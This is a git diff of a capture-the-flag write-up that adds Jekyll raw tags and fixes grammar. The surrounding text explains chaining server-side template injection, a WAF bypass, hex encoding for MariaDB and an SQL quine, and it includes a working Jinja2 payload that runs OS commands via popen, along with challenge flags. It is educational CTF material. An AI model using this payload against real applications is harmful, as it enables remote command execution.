@@ -342,7 +342,7 @@ def home():
     return render_template_string(open("templates/home.html").read() % session["user"])
 ```
 
-If `session["user"]` is like `{{ 7*7 }}`, SSTI will be awakened. 
+If `session["user"]` is like {% raw %}`{{ 7*7 }}`{% endraw %}, SSTI will be awakened. 
 By the way, This application uses MariaDB. MariaDB parses hex to string automated. So I can embed SSTI payload in hex.
 
 To bypass waf, I used `\` like this:
@@ -352,6 +352,7 @@ To bypass waf, I used `\` like this:
 ```
 
 My final solver:
+{% raw %}
 ```py
 import requests
 import binascii
@@ -406,6 +407,7 @@ def solve():
 if __name__ == "__main__":
     solve()
 ```
+{% endraw %}
 `uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}`
 
 
@@ -471,7 +473,7 @@ app.post('/api/autosave', requireLogin, (req, res) => {
 });
 ```
 
-If sid is already exist, replaced in magic link.
+If sid is already exist, be replaced in magic link.
 ```py
 app.get('/magic/:token', (req, res) => {
   const db = req.db;
@@ -683,11 +685,14 @@ if not username == row[0] or not password == row[1]:
 I used SQL Quine technique like this: `REPLACE(<Template>, <Placeholder>, HEX(<Template>))`
 Also I can't use quotes in payload, so I made webshell without quotes and sent command with query `?c=/readflag` in /home.
 My new SSTI payload (non-quotes) is:
+{% raw %}
 ```
 {{ url_for.__globals__.os.popen(request.args[request.args|list|first]).read() if request.args else 1 }}
 ```
+{% endraw %}
 
 Final solver:
+{% raw %}
 ```py
 import requests
 import re
@@ -744,6 +749,7 @@ def solve():
 if __name__ == "__main__":
     solve()
 ```
+{% endraw %}
 `uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}`
 
 
